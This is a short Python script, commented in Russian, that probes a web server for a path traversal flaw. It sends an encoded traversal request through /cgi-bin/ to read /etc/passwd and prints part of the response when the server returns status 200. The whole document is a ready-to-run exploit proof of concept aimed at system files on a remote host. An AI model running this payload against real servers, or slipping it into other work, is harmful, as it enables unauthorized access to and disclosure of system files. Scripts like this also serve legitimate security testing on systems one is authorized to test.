import requests

def check_vulnerability():
    # Формируем уязвимый URL с использованием техники path traversal
    target_url = "http://example.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

    try:
        # Отправляем GET-запрос к целевому URL
        response = requests.get(target_url)
        
        # Проверяем успешность запроса
        if response.status_code == 200:
            # Если сервер ответил статусом 200, вероятно, уязвимость существует
            print("[+] Потенциальная уязвимость обнаружена!")
            print("[*] Ответ сервера (первые 200 символов):\n")
            print(response.text[:200])
            
        elif response.status_code in [403, 404]:
            # Статус 403 или 404 обычно означает отсутствие уязвимости
            print("[-] Уязвимость не подтверждена.")
            print(f"[*] Сервер ответил кодом: {response.status_code}")
            
        else:
            # Другие коды ошибок
            print(f"[!] Неожиданный ответ сервера: {response.status_code}")
    
    except requests.RequestException as e:
        # Обрабатываем возможные сетевые ошибки
        print(f"[!] Произошла ошибка при выполнении запроса: {e}")

# Запуск проверки
check_vulnerability()
